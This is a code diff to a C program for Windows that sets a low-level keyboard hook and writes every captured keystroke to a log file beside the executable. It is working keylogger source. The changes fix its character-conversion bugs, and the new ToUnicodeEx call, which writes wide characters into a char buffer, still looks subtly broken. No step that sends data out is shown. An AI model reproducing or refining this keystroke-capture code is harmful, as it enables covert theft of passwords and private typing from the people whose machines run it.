@@ -3,6 +3,8 @@
 #include <stdio.h>
 #include <stdlib.h>
 
+#pragma warning (disable:5045)
+
 #pragma comment( lib, "user32.lib") 
 #pragma comment( lib, "gdi32.lib")
 
@@ -21,7 +23,6 @@ int writeLogs (KBDLLHOOKSTRUCT kbdStruct)
 {
     HANDLE hFile;
     DWORD dwBytesWritten;
-    char charString[1024] = {0};
     TCHAR modulePath[MAX_PATH];
     TCHAR moduleFolder[MAX_PATH];
     TCHAR logsPath[MAX_PATH];
@@ -67,6 +68,7 @@ int writeLogs (KBDLLHOOKSTRUCT kbdStruct)
     char* specialCase = handleSpecialCase(kbdStruct.vkCode);
     if (specialCase == NULL)
     {
+        char charString[1024] = {0};
         BOOL useUpperCase = (shiftIsHeld && !capsLockActivated) || (!shiftIsHeld && capsLockActivated);
         DWORD threadId = foreground ? GetWindowThreadProcessId(foreground, NULL) : 0;
         BYTE keyboardState[256];
@@ -74,16 +76,14 @@ int writeLogs (KBDLLHOOKSTRUCT kbdStruct)
         GetKeyState(VK_SHIFT);
         GetKeyState(VK_MENU);
         GetKeyboardState(keyboardState);
-        LPWSTR outputStore;
         // if control is up do not use tounicode to bypass control characters
         if (GetKeyState(VK_CONTROL) & SHIFTED)
         {
-            charString[0] = useUpperCase ? kbdStruct.vkCode : tolower(kbdStruct.vkCode);
+            charString[0] = useUpperCase ? (char)kbdStruct.vkCode : (char)tolower(kbdStruct.vkCode);
             charString[1] = '\0';
         }
         else
-            ToUnicodeEx(kbdStruct.vkCode, kbdStruct.scanCode, keyboardState, outputStore, 8, 0, GetKeyboardLayout(threadId));
-        wcstombs_s(charString, outputStore, 500);
+            ToUnicodeEx(kbdStruct.vkCode, kbdStruct.scanCode, keyboardState, (LPWSTR)charString, 8, 0, GetKeyboardLayout(threadId));
         WriteFile( 
             hFile,
             charString,
@@ -99,7 +99,6 @@ int writeLogs (KBDLLHOOKSTRUCT kbdStruct)
             strlen(specialCase),
             &dwBytesWritten,
             NULL);
-
     }
 
 
@@ -167,7 +166,8 @@ void SetHook(void)
 {
 	// Set the hook and set it to use the callback function above
 	// WH_KEYBOARD_LL means it will set a low level keyboard hook
-	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
+    _hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);
+	if (!_hook)
 	{
 		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
 	}
